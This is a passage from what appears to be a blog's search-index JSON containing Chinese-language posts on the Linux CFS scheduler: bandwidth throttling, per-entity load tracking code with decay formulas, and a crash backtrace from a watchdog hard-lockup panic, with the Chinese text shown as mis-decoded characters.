// å¦‚æœå½“å‰ se æ˜¯è¢«å”¤é†’çš„ if (flags &amp; ENQUEUE_WAKEUP) &#123; place_entity(cfs_rq, se, 0); enqueue_sleeper(cfs_rq, se); &#125; update_stats_enqueue(cfs_rq, se); check_spread(cfs_rq, se); if (se != cfs_rq-&gt;curr) __enqueue_entity(cfs_rq, se); se-&gt;on_rq = 1; if (cfs_rq-&gt;nr_running == 1) &#123; list_add_leaf_cfs_rq(cfs_rq); check_enqueue_throttle(cfs_rq); // cfs_rq é™æµæ£€æŸ¥ &#125;&#125; 12345678910111213141516171819202122232425/* * When a group wakes up we want to make sure that its quota is not already * expired/exceeded, otherwise it may be allowed to steal additional ticks of * runtime as update_curr() throttling can not not trigger until it&#x27;s on-rq. */static void check_enqueue_throttle(struct cfs_rq *cfs_rq)&#123; if (!cfs_bandwidth_used()) // å¦‚æœé™æµæ²¡æœ‰å¼€ return; /* an active group must be handled by the update_curr()-&gt;put() path */ if (!cfs_rq-&gt;runtime_enabled || cfs_rq-&gt;curr) // å¦‚æœ runtime æ²¡æœ‰å¯ç”¨ return; /* ensure the group is not already throttled */ if (cfs_rq_throttled(cfs_rq)) // å·²ç»é™æµæ“ä½œäº† return; /* update runtime allocation */ account_cfs_rq_runtime(cfs_rq, 0); // å†æŠ¢æ•‘ä¸€ä¸‹è¯•è¯• if (cfs_rq-&gt;runtime_remaining &lt;= 0) // æŠ¢æ•‘æ— æ•ˆï¼Œé™æµå¼€å§‹ã€‚ // å…·ä½“å®ç°ï¼šå°±æ˜¯ task group é™æµçš„å°¾æ’åˆ° cfs_rq ç»´æŠ¤çš„å·²ç»é™æµçš„åˆ—è¡¨é‡Œé¢ã€‚ throttle_cfs_rq(cfs_rq); &#125; [^zhihu]: ç°åœ¨çš„ Linux å†…æ ¸å’Œ Linux 2.6 çš„å†…æ ¸æœ‰å¤šå¤§åŒºåˆ«ï¼Ÿ[^roadmap]: CPU bandwidth control for CFS Roadmap","tags":["linux"]},{"title":"cfs per entity load track","path":"/2017/09/21/cfs-per-entity-load-track/","content":"0x00 what and whyä¹‹å‰å…¬å¸é‡åˆ°äº†ä¸€ä¸ªç³»ç»Ÿ load avg å¼‚å¸¸ï¼Œä¸€è·¯è¿½æ€çš„è¿‡ç¨‹ä¸­å­¦ä¹ äº† CFS å¹¶å‘ç°äº† cfs per entity load track ç‰¹æ€§ï¼Œå‡‘å·§çš„æ˜¯ lwn [^lwn]çš„æ–‡ç« è¢«é˜¿é‡Œå†…æ ¸æ—¥æŠ¥å›´ç»•ç€åŸæ¥ç³»ç»Ÿæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œå¦‚ä½•è§£å†³çš„ï¼Œè¾¾åˆ°äº†ä»€ä¹ˆæˆæœçš„æ–¹æ³•é˜è¿°äº†ä¸€éï¼š æ–‡ç« é¦–å…ˆå›é¡¾äº†ä¸€ä¸‹ä»»åŠ¡è°ƒåº¦å™¨å’Œä¸ºä»€ä¹ˆæœ‰äº† CPU åˆ©ç”¨ç‡è¿˜éœ€è¦è¡¡é‡â€œloadâ€ã€‚åé¢çš„å†…å®¹æ›´æœ‰æ„æ€ä¸€äº›ï¼šPaul Turner çš„ per-entity load tracking å·²ç»åˆå¹¶åˆ° 3.8 å†…æ ¸é‡Œã€‚ ä¹‹å‰çš„ CFS ä»¥æ¯ä¸ª CPU ä¸Šçš„è¿è¡Œé˜Ÿåˆ— (per cpu runqueue) ä¸ºå•ä½è®¡ç®— loadï¼Œä½†ä½¿ç”¨äº† group scheduler ä¹‹åï¼Œæ¯ä¸ª cgroup éƒ½æœ‰ä¸€ä¸ªè‡ªå·±çš„ per CPU è¿è¡Œé˜Ÿåˆ—ï¼Œè€Œå¦‚æœå†…æ ¸éœ€è¦äº†è§£æ¯ä¸ª cgroup å¯¹ç³»ç»Ÿæ•´ä½“ load çš„è´¡çŒ®æƒ…å†µï¼ŒåŸæ¥çš„æ–¹æ¡ˆå°±ä¸èƒ½æ»¡è¶³éœ€è¦äº†ï¼Œè€Œä¸”åŸºäº per CPU runqueue çš„æ–¹æ³•ä¹Ÿæœ‰ç»“æœæ³¢åŠ¨è¿‡å¤§çš„ç¼ºç‚¹ã€‚ per-entity load çš„æ–¹æ³•åˆ™æ˜¯æŠŠ cgroup å†…çš„æ‰€æœ‰ä»»åŠ¡éƒ½ä¸²æ¥åˆ°ä¸€ä¸ªé˜Ÿåˆ—ä¸Šã€‚è®¡ç®— load æ—¶ï¼Œæ—¶é—´ä»¥ä¸€ä¸ªæ¯«ç§’ï¼ˆå‡†ç¡®åœ°è¯´æ˜¯ 1024Âµsï¼‰ä¸ºå•ä½å‘å‰æ»šåŠ¨ã€‚ä¸€ä¸ª entity åœ¨å‘¨æœŸ $$p_{i}$$ å¯¹ç³»ç»Ÿ load çš„è´¡çŒ®å°±æ˜¯è¯¥å‘¨æœŸå†…å¯è¿è¡Œéƒ¨åˆ†æ—¶é—´ï¼ˆä»»åŠ¡æ­£åœ¨è¿è¡Œï¼Œæˆ–è€…å¤„äºå°±ç»ªçŠ¶æ€ï¼‰ã€‚å‘¨æœŸè¶Šæ—§ï¼Œå¯¹å½“å‰ load å½±å“è¶Šå°ï¼Œå…·ä½“åœ°ï¼Œä»¤ Li ä¸ºå‘¨æœŸ$$p_{i}$$å¯¹å½“å‰è´Ÿè½½çš„è´¡çŒ®ï¼Œåˆ™å½“å‰ load ä¸ºï¼š $$L &#x3D; L0 + L1y + L2y^2 + L3*y^3$$ è¿™ä¸ªå…¬å¼çš„ä¼˜ç‚¹æ˜¯è®¡ç®—å½“å‰ load ä¸éœ€è¦ä¿å­˜å®Œæ•´çš„å†å²æ•°æ®ï¼Œåªéœ€è¦ç´¯åŠ å°±è¡Œäº†ã€‚å…¶ä¸­ï¼Œy æ˜¯å°äº 1 çš„è¡°å‡å› å­ã€‚ç›®å‰å–å€¼ä¸ºä½¿ y32&#x3D;0.5 çš„å€¼ï¼ˆå½“ç„¶è®¡ç®—è¿›ç¨‹æ˜¯ä»¥å®šç‚¹æ–¹å¼è¿›è¡Œçš„ï¼‰ï¼Œå³ 32ms ä¹‹å‰çš„ load å¯¹å½“å‰ load æœ‰ 50% çš„è´¡çŒ®ã€‚3.8 å†…æ ¸é‡Œï¼Œä¼šå¯¹é˜»å¡æ‰çš„ä»»åŠ¡ï¼Œä¹Ÿä½¿ç”¨ç›¸åŒçš„è®¡ç®—æ–¹æ³•ï¼Œç„¶åå°†â€é˜»å¡ loadâ€ä¸ä»¥ä¸Šâ€CPU loadâ€ç›¸åŠ å¾—åˆ°å®Œæ•´çš„ per-entity loadã€‚å½“ç„¶å¦‚æœä¸€ä¸ªé˜»å¡ä»»åŠ¡ä¹‹åè¿›å…¥å°±ç»ªçŠ¶æ€ï¼Œå°±ä¼šç®—å…¥ä¸Šé¢çš„ CPU load å…¬å¼é‡Œã€‚æ­¤å¤–ï¼Œload è®¡ç®—è¿˜è·³è¿‡äº†åœ¨ CPU bandwidth controller æ§åˆ¶ä¸‹çš„ throttled processesã€‚å¯¹è¿™äº› per-entity load æ±‚å’Œå°±å¯ä»¥å¾—åˆ°æ•´ä¸ªç³»ç»Ÿçš„ load äº†ã€‚ è¿™é‡Œè¡¥å……ä¸€ä¸‹ç‰¹æ€§çš„å®ç°ç»†èŠ‚ (v4.14-rc2)ï¼š 0x01 cfs overviewæ€»æ‰€å‘¨çŸ¥ Linux çš„è®¾è®¡æ˜¯éå¸¸ä¼˜ç§€ï¼Œéå¸¸æ ¸å¿ƒçš„è°ƒåº¦å­ç³»ç»Ÿä¹Ÿåœ¨ä»£ç å±‚é¢åšäº†æ¨¡å—åŒ–å°è£…ï¼Œç®€è¦å…³æ³¨ä¸€ä¸‹ cfs è°ƒåº¦ç±»çš„å®ç° (å…¶å®ƒè°ƒåº¦ç±»ä¹Ÿæ˜¯è¦å®ç°ç»“æ„ä½“ä¸­çš„å¤§å¤šæ•°æ–¹æ³•çš„)ã€‚ 123456789/* * All the scheduling class methods: */const struct sched_class fair_sched_class = &#123;\t.next = &amp;idle_sched_class,\t.enqueue_task = enqueue_task_fair, // here ...#endif&#125;; ä¸Šé¢ä»£ç æ‘˜å½•è‡ª cfs è°ƒåº¦ç±»ï¼Œå…³æ³¨å…¥é˜Ÿæ“ä½œ enqueue_task_fair æµç¨‹ä¸­ load çš„è®¡ç®—ç»†èŠ‚ï¼Œä¸å…³æ³¨ dequeu_task_fair çš„æ˜¯å› ä¸ºå®ƒä»¬éå¸¸ç±»ä¼¼ã€‚ 1234567891011121314151617181920212223242526272829/* * The enqueue_task method is called before nr_running is * increased. Here we update the fair scheduling stats and * then put the task into the rbtree: */static voidenqueue_task_fair(struct rq *rq, struct task_struct *p, int flags)&#123; struct cfs_rq *cfs_rq; struct sched_entity *se = &amp;p-&gt;se; /* * If in_iowait is set, the code below may not trigger any cpufreq * utilization updates, so do it here explicitly with the IOWAIT flag * passed. */ if (p-&gt;in_iowait) cpufreq_update_util(rq, SCHED_CPUFREQ_IOWAIT); ... for_each_sched_entity(se) &#123; cfs_rq = cfs_rq_of(se); cfs_rq-&gt;h_nr_running++; if (cfs_rq_throttled(cfs_rq)) break; update_load_avg(se, UPDATE_TG); // here... ä»¥ä¸Šæ˜¯å…¥é˜Ÿæ“ä½œçš„å®ç°çš„éƒ¨åˆ†ï¼Œcfs æ˜¯çš„æ“ä½œçš„æ—¶é—´å¤æ‚åº¦æ˜¯åˆ©ç”¨ rbtree çš„æ•°æ®ç»“æ„çš„ä¼˜åŠ¿ï¼Œcfs ä»¥ vruntime ä¸º value ç»„ç»‡ rbtreeï¼Œæ¯æ¬¡é€‰æ‹©è°ƒåº¦å®ä½“ (se) ä»æœ€å·¦å–ï¼Œæ›´å¤šç»†èŠ‚å‚è€ƒ[^LKDe3]ã€‚ 1234567891011121314151617/* Update task and its cfs_rq load average */static inline void update_load_avg(struct sched_entity *se, int flags)&#123; struct cfs_rq *cfs_rq = cfs_rq_of(se); u64 now = cfs_rq_clock_task(cfs_rq); struct rq *rq = rq_of(cfs_rq); int cpu = cpu_of(rq); int decayed; /* * Track task load average for carrying it to new CPU after migrated, and * track group sched_entity load average for task_h_load calc in migration */ if (se-&gt;avg.last_update_time &amp;&amp; !(flags &amp; SKIP_AGE_LOAD)) __update_load_avg_se(now, cpu, cfs_rq, se); // here...&#125; ä¸Šè¿°å‡½æ•°å‡†å¤‡ä¸€äº›å‚æ•°æ¥è®¡ç®— se çš„ load å€¼ï¼Œå®ç°è¿˜æ˜¯éå¸¸å¥½ç†è§£çš„ã€‚ 1234567static int__update_load_avg_se(u64 now, int cpu, struct cfs_rq *cfs_rq, struct sched_entity *se)&#123; return ___update_load_avg(now, cpu, &amp;se-&gt;avg, se-&gt;on_rq * scale_load_down(se-&gt;load.weight), cfs_rq-&gt;curr == se, NULL);&#125; ä¸€ä¸ª wrapper, ä¼ å…¥ç¬¬ä¸‰ä¸ªå‚æ•° se-&gt;avg æ˜¯å¦‚ä¸‹è§çš„ä¸å¤šçš„ç»“æ„ä½“ï¼š 12345678struct sched_avg &#123; u64 last_update_time; // Last load update time u64 load_sum; u32 util_sum; u32 period_contrib; // unsigned long load_avg; // runnable% * scale_load_down(load) * freq% unsigned long util_avg; // running% * SCHED_CAPACITY_SCALE * freq% * capacity%&#125;; ä¸‹é¢æœ‰å¦‚ä½•åˆå§‹åŒ–ä¸€ä¸ª se-&gt;avg çš„å‡½æ•°å¯¹ä¸Šé¢ç»“æ„ä½“è§£é‡Šéå¸¸åˆ°ä½ã€‚ 12345678910111213141516171819202122232425262728/* Give new sched_entity start runnable values to heavy its load in infant time */void init_entity_runnable_average(struct sched_entity *se)&#123; struct sched_avg *sa = &amp;se-&gt;avg; sa-&gt;last_update_time = 0; /* * sched_avg&#x27;s period_contrib should be strictly less then 1024, so * we give it 1023 to make sure it is almost a period (1024us), and * will definitely be update (after enqueue). */ sa-&gt;period_contrib = 1023; /* * Tasks are intialized with full load to be seen as heavy tasks until * they get a chance to stabilize to their real load level. * Group entities are intialized with zero load to reflect the fact that * nothing has been attached to the task group yet. */ if (entity_is_task(se)) sa-&gt;load_avg = scale_load_down(se-&gt;load.weight); sa-&gt;load_sum = sa-&gt;load_avg * LOAD_AVG_MAX; /* * At this point, util_avg won&#x27;t be used in select_task_rq_fair anyway */ sa-&gt;util_avg = 0; sa-&gt;util_sum = 0; /* when this task enqueue&#x27;ed, it will contribute to its cfs_rq&#x27;s load_avg */&#125; 0x02 core path: ___update_load_avgè¿™æ˜¯ per entity load track é‡è¦çš„å…¥å£å‡½æ•°ï¼Œåœ¨ 4.12 ä¹‹å‰å®ç°ä¸ä¹‹å‰ä¸ä¸€æ ·ï¼Œä¼˜åŒ–æ–¹æ³•æ˜¯åœ¨ patch[^Optimize]ä¸­å¼•å…¥çš„ï¼Œä½†æ˜¯æ€è·¯ä¸€è‡´ã€‚å¼€å‘è€…ç”¨å‡ ä½•çº§æ•°æ¥è¡¨ç¤ºå†å²ä¸Š se è´¡çŒ®çš„ runnable averageï¼Œè¿™æ ·åšé¦–å…ˆéœ€è¦æŠŠ runable çš„å…¨éƒ¨æ—¶é—´åˆ‡åˆ†æˆè¿‘ä¼¼ 1024 us (çº¦ 1ms) çš„æ—¶é—´ç‰‡ï¼Œå¹¶æ ‡è®°æ—¶é—´ç‰‡ä¸º N-ms ä¹‹å‰ä¸º $$p_N$$, æ¯”å¦‚ $$p_0$$ å°±è¡¨ç¤ºå½“å‰çš„æ—¶é—´ç‰‡ï¼Œç¤ºæ„å›¾å¦‚ä¸‹ï¼š |&lt;- 1024us -&gt;|&lt;- 1024us -&gt;|&lt;- 1024us -&gt;|| p0 | p1 | p2 || (now) | (1ms ago) | (2ms ago)| è®© $$u_i$$ è¡¨ç¤º $$p_i$$ ä¸­è°ƒåº¦å®ä½“å¯ä»¥è¿è¡Œçš„çš„ä¸€éƒ¨åˆ†ã€‚ ç„¶åæˆ‘ä»¬æŒ‡å®š$$u_i$$ä¸ºç³»æ•°ï¼Œåˆ™äº§ç”Ÿå¦‚ä¸‹è®¡ç®—ä¹‹å‰è´Ÿè½½çš„ç­‰å¼ï¼š $$u_0 + u_1y + u_2y^2 + u_3*y^3 + â€¦$$ åŸºäºåˆç†çš„è°ƒåº¦å‘¨æœŸé€‰æ‹© yï¼Œä¿®æ­£å…¬å¼å¦‚ä¸‹ï¼š $$y^{32} &#x3D; 0.5$$ è¿™æ„å‘³å¤§çº¦ 32ms $$u_{32}$$ ä¹‹å‰çš„è´Ÿè½½è´¡çŒ®ç»è¿‡åŠ æƒåè®¡ç®—å¤§çº¦æ˜¯å½“å‰ä¸€æ¯«ç§’ $$u_0$$ çš„ä¸€åŠã€‚ å¦‚æœå‘ç”Ÿäº†æ—¶é—´ç‰‡çš„ rolls over ç°è±¡ï¼Œä¼šäº§ç”Ÿäº†æ–°$${u_0}â€™$$,è¿™æ—¶ç”¨æ–°çš„$${u_0}â€™$$åŠ ä¸Š y ä¹˜ä»¥ä¹‹å‰çš„å’Œå°±å¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚ $$ \\begin{align*} load_avg &amp;&#x3D; {u_0}â€™ + y*(u_0 + u_1y + u_2y^2 + â€¦ ) \\ &amp;&#x3D; u_0 + u_1y + u_2y^2 + â€¦ [re-labeling u_i -&gt; u_{i+1}] \\end{align*} $$ è€Œ __update_load_avg å‡½æ•°æœ¬èº«é™¤äº†åšäº†ä¸€äº›å¼‚å¸¸æ£€æŸ¥ï¼Œæœ€æœ€æ ¸å¿ƒçš„éƒ¨åˆ†å°±æ˜¯è°ƒç”¨ accumulate_sum è®¡ç®— loadï¼Œç„¶åæ›´æ–° sched_avgã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859static __always_inline int___update_load_avg(u64 now, int cpu, struct sched_avg *sa, unsigned long weight, int running, struct cfs_rq *cfs_rq)&#123; u64 delta; delta = now - sa-&gt;last_update_time; // è®¡ç®—æ–°é‡‡æ ·å‘¨æœŸçš„å€¼ /* * This should only happen when time goes backwards, which it * unfortunately does during sched clock init when we swap over to TSC. */ if ((s64)delta &lt; 0) &#123; sa-&gt;last_update_time = now; return 0; &#125; /* * Use 1024ns as the unit of measurement since it&#x27;s a reasonable * approximation of 1us and fast to compute. */ delta &gt;&gt;= 10; // æŠŠå‘¨æœŸå€¼ç”± ns è½¬åŒ–ä¸º us if (!delta) return 0; sa-&gt;last_update_time += delta &lt;&lt; 10; // ä¸Šä¸€æ­¥çš„é€†æ“ä½œå¹¶æ›´æ–° sa-&gt;last_update_time /* * running is a subset of runnable (weight) so running can&#x27;t be set if * runnable is clear. But there are some corner cases where the current * se has been already dequeued but cfs_rq-&gt;curr still points to it. * This means that weight will be 0 but not running for a sched_entity * but also for a cfs_rq if the latter becomes idle. As an example, * this happens during idle_balance() which calls * update_blocked_averages() */ if (!weight) running = 0; /* * Now we know we crossed measurement unit boundaries. The *_avg * accrues by two steps: * * Step 1: accumulate *_sum since last_update_time. If we haven&#x27;t * crossed period boundaries, finish. */ if (!accumulate_sum(delta, cpu, sa, weight, running, cfs_rq)) // look here !!! è®¡ç®—ç´¯è®¡å‡ºæ¥çš„ load return 0; /* * Step 2: update *_avg. */ sa-&gt;load_avg = div_u64(sa-&gt;load_sum, LOAD_AVG_MAX - 1024 + sa-&gt;period_contrib); if (cfs_rq) &#123; cfs_rq-&gt;runnable_load_avg = div_u64(cfs_rq-&gt;runnable_load_sum, LOAD_AVG_MAX - 1024 + sa-&gt;period_contrib); &#125; sa-&gt;util_avg = sa-&gt;util_sum / (LOAD_AVG_MAX - 1024 + sa-&gt;period_contrib); return 1;&#125; ä¸‹é¢è¿™ä¸ªå‡½æ•° accumulate_sum éå¸¸æ ¸å¿ƒï¼Œå®ƒé€šè¿‡ç´¯åŠ ä¸‰ä¸ªéƒ¨åˆ†çš„æ€»å’Œæ¥è®¡ç®— se çš„è´Ÿè½½å½±å“ï¼›d1 æ˜¯ç¦»å½“å‰æ—¶é—´æœ€è¿œï¼ˆä¸å®Œæ•´çš„ï¼‰period çš„å‰©ä½™éƒ¨åˆ†ï¼Œd2 æ˜¯å®Œæ•´ period çš„è€Œ d3 æ˜¯ï¼ˆä¸å®Œæ•´çš„ï¼‰å½“å‰ period çš„å‰©ä½™éƒ¨åˆ†ã€‚d1ï¼Œd2ï¼Œd3 çš„ç¤ºæ„å›¾å¦‚ä¸‹ï¼š 12345 d1 d2 d3 ^ ^ ^ | | | |&lt;-&gt;|&lt;-----------------&gt;|&lt;---&gt;|... |---x---|------| ... |------|-----x (now) è®¡ç®—å…¬å¼å¦‚ä¸‹ï¼š $$\\begin{align*}{u}â€™ &amp;&#x3D; (u + d1) y^{p} + 1024 \\sum_{n&#x3D;1}^{p-1}y^{n} + d3\\times y^0 \\&amp; &#x3D; u\\times y^{p} + d1\\times y^{p} + 1024 \\sum_{n&#x3D;1}^{p-1} y^{n} + d3\\times y^{0}\\end{align*}$$ æ‹†åˆ†ä¸Šè¿°å…¬å¼ä¸º$$u\\times y^{p}$$ ä¸º step 1ï¼Œ $$d1\\times y^{p} + 1024 \\sum_{n&#x3D;1}^{p-1} y^{n} + d3\\times y^{0}$$ä¸º step 2 å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748static __always_inline u32accumulate_sum(u64 delta, int cpu, struct sched_avg *sa, unsigned long weight, int running, struct cfs_rq *cfs_rq)&#123; unsigned long scale_freq, scale_cpu; u32 contrib = (u32)delta; /* p == 0 -&gt; delta &lt; 1024 */ u64 periods; scale_freq = arch_scale_freq_capacity(NULL, cpu); scale_cpu = arch_scale_cpu_capacity(NULL, cpu); // å‚è€ƒå‰é¢çš„ sched_avg çš„ç¬¬ä¸€æ¬¡ä»‹ç»ï¼Œä¸Šè¿°ä¸¤ä¸ªæ˜¯è®¡ç®—éœ€è¦çš„å‚æ•°ã€‚ delta += sa-&gt;period_contrib; periods = delta / 1024; /* A period is 1024us (~1ms), è¿™è¾¹æ±‚å‡ºçš„å°±æ˜¯ä¸Šè¿°å›¾çš„ d2 çš„å¤§å° */ /* * Step 1: decay old *_sum if we crossed period boundaries. */ if (periods) &#123; sa-&gt;load_sum = decay_load(sa-&gt;load_sum, periods); // è¡°å‡ se-&gt;sa-&gt;load_sumï¼Œ ç°åœ¨è¦æ ¹æ®æŒ‡æ•°è¡°å‡è€çš„å€¼ã€‚ if (cfs_rq) &#123; cfs_rq-&gt;runnable_load_sum = decay_load(cfs_rq-&gt;runnable_load_sum, periods); // å¦‚æœ se åœ¨ cfs_rq ä¸Šï¼Œè¡°å‡ cfs_rq çš„ loadã€‚ &#125; sa-&gt;util_sum = decay_load((u64)(sa-&gt;util_sum), periods); // è¡°å‡ se-&gt;sa-&gt;util_sum /* * Step 2 * commit: 05296e7535d67ba4926b543a09cf5d430a815cb6 */ delta %= 1024; // delta è¡¨ç¤º d3 çš„æ—¶é—´é•¿åº¦ã€‚ contrib = __accumulate_pelt_segments(periods, 1024 - sa-&gt;period_contrib, delta); // è¿™ä¸ªå‡½æ•°æ˜¯æ ¸å¿ƒè®¡ç®—æ–¹æ³•ï¼Œå‚æ•°ï¼šd2ï¼Œd1ï¼Œd3 &#125; sa-&gt;period_contrib = delta; contrib = cap_scale(contrib, scale_freq); // #define cap_scale(v, s) ((v)*(s) &gt;&gt; SCHED_CAPACITY_SHIFT) if (weight) &#123; sa-&gt;load_sum += weight * contrib; if (cfs_rq) // se åœ¨ cfs_rq ä¸Šä¹Ÿè¦æ›´æ–° rq-&gt;runnable_load_sum cfs_rq-&gt;runnable_load_sum += weight * contrib; &#125; if (running) sa-&gt;util_sum += contrib * scale_cpu; return periods;&#125; ä¸‹é¢å‡ ä¸ªå‡½æ•°æ˜¯è®¡ç®—ç»†èŠ‚ $$c1 &#x3D; d1 \\times y^{p}$$, $$c2 &#x3D; 1024 (\\sum_{n&#x3D;0}^{inf} y^{n} - \\sum_{n-p}^{inf} y^{n} - y^{0})$$, $$c3 &#x3D; d3$$ï¼š 1234567static u32 __accumulate_pelt_segments(u64 periods, u32 d1, u32 d3)&#123; u32 c1, c2, c3 = d3; /* y^0 == 1 */ c1 = decay_load((u64)d1, periods); c2 = LOAD_AVG_MAX - decay_load(LOAD_AVG_MAX, periods) - 1024; return c1 + c2 + c3;&#125; 1234567891011121314151617181920212223242526272829/* * Approximate: * val * y^n, where y^32 ~= 0.5 (~1 scheduling period) */static u64 decay_load(u64 val, u64 n)&#123; unsigned int local_n; if (unlikely(n &gt; LOAD_AVG_PERIOD * 63)) return 0; /* after bounds checking we can collapse to 32-bit */ local_n = n; /* * As y^PERIOD = 1/2, we can combine * y^n = 1/2^(n/PERIOD) * y^(n%PERIOD) * With a look-up table which covers y^n (n&lt;PERIOD) * * To achieve constant time decay_load. */ if (unlikely(local_n &gt;= LOAD_AVG_PERIOD)) &#123; val &gt;&gt;= local_n / LOAD_AVG_PERIOD; local_n %= LOAD_AVG_PERIOD; &#125; val = mul_u64_u32_shr(val, runnable_avg_yN_inv[local_n], 32); return val;&#125; ä½¿ç”¨å¸¸é‡ runnable_avg_yN_inv æ•°ç»„ä½¿å¾—è®¡ç®— load è¡°å‡åŠ é€Ÿï¼Œæ•°ç»„ç”Ÿæˆä»£ç ä½äº Documentation&#x2F;scheduler&#x2F;sched-pelt.cï¼Œè®¡ç®—å…¬å¼å¦‚ä¸‹ $$runnable_avg_yN_inv[k] &#x3D; y^{k}\\times 2^{32}, 1\\leq k \\leq 32$$ 12345678910/* Generated by Documentation/scheduler/sched-pelt; do not modify. */static const u32 runnable_avg_yN_inv[] = &#123;\t0xffffffff, 0xfa83b2da, 0xf5257d14, 0xefe4b99a, 0xeac0c6e6, 0xe5b906e6,\t0xe0ccdeeb, 0xdbfbb796, 0xd744fcc9, 0xd2a81d91, 0xce248c14, 0xc9b9bd85,\t0xc5672a10, 0xc12c4cc9, 0xbd08a39e, 0xb8fbaf46, 0xb504f333, 0xb123f581,\t0xad583ee9, 0xa9a15ab4, 0xa5fed6a9, 0xa2704302, 0x9ef5325f, 0x9b8d39b9,\t0x9837f050, 0x94f4efa8, 0x91c3d373, 0x8ea4398a, 0x8b95c1e3, 0x88980e80,\t0x85aac367, 0x82cd8698,&#125;; [^lwn]: Per-entity load tracking[^LKDe3]: Linux Kernel Development[^Optimize]: sched&#x2F;fair: Optimize __update_sched_avg()","tags":["linux"]},{"title":"a panic of watchdog hard lockup","path":"/2017/09/02/a-panice-of-watchdog/","content":"è¿™ä¸ªå‘¨ä¸€æ—©ä¸Šæ¥å·¥ä½œè¢«å‘ŠçŸ¥ä¸Šå‘¨æœ‰ 4 å°ç‰©ç† crash äº†ï¼Œéœ€è¦è¯Šæ–­ä¿®å¤ï¼Œ è¡¨è±¡ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445 #0 [ffff88103fbc59f0] machine_kexec at ffffffff81059beb #1 [ffff88103fbc5a50] __crash_kexec at ffffffff81105822 #2 [ffff88103fbc5b20] panic at ffffffff81680541 #3 [ffff88103fbc5ba0] nmi_panic at ffffffff81085abf #4 [ffff88103fbc5bb0] watchdog_overflow_callback at ffffffff8112f879 #5 [ffff88103fbc5bc8] __perf_event_overflow at ffffffff81174d2e #6 [ffff88103fbc5c00] perf_event_overflow at ffffffff81175974 #7 [ffff88103fbc5c10] intel_pmu_handle_irq at ffffffff81009d88 #8 [ffff88103fbc5e38] perf_event_nmi_handler at ffffffff8168ed6b #9 [ffff88103fbc5e58] nmi_handle at ffffffff816901b7#10 [ffff88103fbc5eb0] do_nmi at ffffffff816903c3#11 [ffff88103fbc5ef0] end_repeat_nmi at ffffffff8168f5d3 [exception RIP: update_curr+15] RIP: ffffffff810ce3cf RSP: ffff88103fbc3db8 RFLAGS: 00000002 RAX: 0000000000000001 RBX: ffff88092b2ed200 RCX: 0000000000000001 RDX: 0000000000000001 RSI: ffff88092b2ed200 RDI: ffff880f6afb8600 RBP: ffff88103fbc3dd0 R8: ffff88103d2b7500 R9: 0000000000000001 R10: 0000000000000000 R11: 0000000000000000 R12: ffff880f6afb8600 R13: 0000000000000001 R14: 0000000000000003 R15: ffff8813bf7f5548 ORIG_RAX: ffffffffffffffff CS: 0010 SS: 0018--- &lt;NMI exception stack&gt; ---#12 [ffff88103fbc3db8] update_curr at ffffffff810ce3cf#13 [ffff88103fbc3dd8] enqueue_entity at ffffffff810d042d#14 [ffff88103fbc3e20] unthrottle_cfs_rq at ffffffff810d16f4#15 [ffff88103fbc3e58] distribute_cfs_runtime at ffffffff810d1932#16 [ffff88103fbc3ea0] sched_cfs_period_timer at ffffffff810d1acf#17 [ffff88103fbc3ed8] __hrtimer_run_queues at ffffffff810b4d72#18 [ffff88103fbc3f30] hrtimer_interrupt at ffffffff810b5310#19 [ffff88103fbc3f80] local_apic_timer_interrupt at ffffffff81051037#20 [ffff88103fbc3f98] smp_apic_timer_interrupt at ffffffff81699f0f#21 [ffff88103fbc3fb0] apic_timer_interrupt at ffffffff8169845d--- &lt;IRQ stack&gt; ---#22 [ffff8801699a3de8] apic_timer_interrupt at ffffffff8169845d [exception RIP: native_safe_halt+6] RIP: ffffffff81060fe6 RSP: ffff8801699a3e98 RFLAGS: 00000286 RAX: 00000000ffffffed RBX: ffff88103fbcd080 RCX: 0100000000000000 RDX: 0000000000000000 RSI: 0000000000000000 RDI: 0000000000000046 RBP: ffff8801699a3e98 R8: 0000000000000000 R9: 0000000000000000 R10: 0000000000000000 R11: 0000000000000000 R12: 00099b9bb0645f00 R13: ffff88103fbcfde0 R14: f21bf8c4662d3c34 R15: 0000000000000082 ORIG_RAX: ffffffffffffff10 CS: 0010 SS: 0018#23 [ffff8801699a3ea0] default_idle at ffffffff810347ff#24 [ffff8801699a3ec0] arch_cpu_idle at ffffffff81035146#25 [ffff8801699a3ed0] cpu_startup_entry at ffffffff810e82f5#26 [ffff8801699a3f28] start_secondary at ffffffff8104f0da å½±å“èŒƒå›´ï¼š ç¡®è®¤çš„èŒƒå›´æœ‰ Linux 3.10.0-514.26.2.el7 è§£å†³æ–¹æ¡ˆï¼š ç­‰å¾…ä¸Šæ¸¸åˆå¹¶ patch c06f04c70489b9deea3212af8375e2f0c2f0b184 åŸå› ^patchï¼š distribute_cfs_runtime() intentionally only hands out enough runtime to bring each cfs_rq to 1 ns of runtime, expecting the cfs_rqs to then take the runtime they need only once they actually get to run. However, if they get to run sufficiently quickly, the period timer is still in distribute_cfs_runtime() and no runtime is available, causing them to throttle. Then distribute has to handle them again, and this can go on until distribute has handed out all of the runtime 1ns at a time, which takes far too long. è¯Šæ–­è¿‡ç¨‹ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647crash&gt; btPID: 0 TASK: ffff880169986dd0 CPU: 7 COMMAND: &quot;swapper/7&quot; #0 [ffff88103fbc59f0] machine_kexec at ffffffff81059beb #1 [ffff88103fbc5a50] __crash_kexec at ffffffff81105822 #2 [ffff88103fbc5b20] panic at ffffffff81680541 #3 [ffff88103fbc5ba0] nmi_panic at ffffffff81085abf #4 [ffff88103fbc5bb0] watchdog_overflow_callback at ffffffff8112f879 #5 [ffff88103fbc5bc8] __perf_event_overflow at ffffffff81174d2e #6 [ffff88103fbc5c00] perf_event_overflow at ffffffff81175974 #7 [ffff88103fbc5c10] intel_pmu_handle_irq at ffffffff81009d88 #8 [ffff88103fbc5e38] perf_event_nmi_handler at ffffffff8168ed6b #9 [ffff88103fbc5e58] nmi_handle at ffffffff816901b7#10 [ffff88103fbc5eb0] do_nmi at ffffffff816903c3#11 [ffff88103fbc5ef0] end_repeat_nmi at ffffffff8168f5d3 [exception RIP: update_curr+15] RIP: ffffffff810ce3cf RSP: ffff88103fbc3db8 RFLAGS: 00000002 